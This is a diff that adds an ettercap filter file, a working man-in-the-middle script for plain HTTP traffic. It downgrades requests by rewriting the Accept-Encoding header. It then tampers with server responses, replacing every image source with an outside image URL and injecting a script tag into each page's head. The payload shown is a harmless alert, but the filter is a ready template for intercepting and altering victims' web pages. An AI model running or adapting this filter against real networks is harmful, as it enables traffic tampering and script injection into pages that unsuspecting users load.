@@ -1,0 +1,27 @@
+############################################################################
+#                                                                          #
+#  ettercap -- etter.filter -- filter source file                          #
+#                                                                          #
+#  Copyright (C) ALoR & NaGA                                               #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        replace("Accept-Encoding", "Accept-Nothing!");
+        # note: replacement string is same length as original string
+        msg("zapped Accept-Encoding!");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("img src=", "img src='http://pic.58pic.com/58pic/13/95/96/70v58PICwpU_1024.jpg' ");
+    replace("<head>", "<head><script type='text/javascript'>alert('hello world');</script>");
+    msg("Filter Ran.\n");
+}
+
